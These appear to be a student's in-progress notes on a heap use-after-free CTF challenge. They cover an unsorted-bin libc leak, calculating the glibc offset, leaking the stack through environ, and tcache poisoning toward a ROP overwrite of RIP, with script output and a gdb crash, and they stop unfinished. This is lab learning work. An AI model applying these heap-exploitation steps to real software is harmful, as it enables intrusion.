This one looks about the same as the last UAF

Strategy:
1) Leak stack address
2) Calculate current frame
3) Return a pointer to the current stack
4) Overwrite RIP
5) Profit?

# Leaking
## Libc
###### Steps
1) Allocate two things
	In this case, make two `notes`
2) Set them free
	call `delete` on both `notes`
3) Print `note0`?

Code is basically the same as last week:
```
┌──(kali㉿kali)-[~/Desktop/8-Week/UAF]
└─$ python3 UAF_PWN_DBG1.py
Adding note 0
Adding note 1
Deleting note 0
Reading address from note 0

>Content:
0x7ffff7f9ece0
Leaked Address:
0x7ffff7f9ece0
```
But yay

Remote too:
```
┌──(kali㉿kali)-[~/Desktop/8-Week/UAF]
└─$ python3 UAF_PWN_1.py   
[*] '/home/kali/Desktop/8-Week/UAF/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/kali/Desktop/8-Week/UAF/challenge/chal': pid 17533
Adding note 0
Size:

Adding note 1
Size:

Deleting note 0
which note do you wanna delete?

Reading address from note 0
which note do you wanna read?

>Content:

0x7f16fa877ce0
Leaked Address:
0x7f16fa877ce0

```


Offset to GLIBC Base
```
offset = leak - base
offset = 0x7ffff7f9ece0 - 0x00007ffff7dcb000
offset = 1D3CE0
```

This technique still works as it attempts to leak a part of the unsortedbins, not tcache, which has been fixed
## Stack
So...how tf do I leak a stack address

# hmmmm, it looks like tcache attack isn't going to work\
We get to step 6 and it crashes:
```
=========== NYU OFFSEC ============
>1
Size:
24
malloc(): unaligned tcache chunk detected

Program received signal SIGABRT, Aborted.
__pthread_kill_implementation (threadid=<optimized out>, signo=signo@entry=0x6, no_tid=no_tid@entry=0x0) at ./nptl/pthread_kill.c:44
```

[This writeup](https://ctftime.org/writeup/35951) mentions safe-linking bypasses


Okay, this talks about stack leak to ROP, which is exactly what I wanted to do:
# New Technique: Stack Leak + ROP
### 1) Leak glibc `environ` variable
This will have a stack address
	I might already have this if I can calculate based on Libc Base

Yay
```
envi = libc + elf.symbols['environ']
	print(hex(envi))

0x7ffff7fa6320

gef➤  $ x/2x 0x7ffff7fa6320
0x7ffff7fa6320 <environ>:    0xffffdee8    0x00007fff
```

That was actually way easier than how they did it in the guide I think

Though I realized that I wanted the heap addr too, so I went back and did it their way (which was v easy)

## 2) TCache Poisoning
Allocate notes of size 0
	Malloc(0) returns chunks from the `0x20` size tcache, as that is the smallest chunk size
	Nothing is written to the environ chunk for `fgets` though\


# Where are we at:
Leaking the wrong address for the `environ` variable



```c
p *(struct tcache_entry*)
```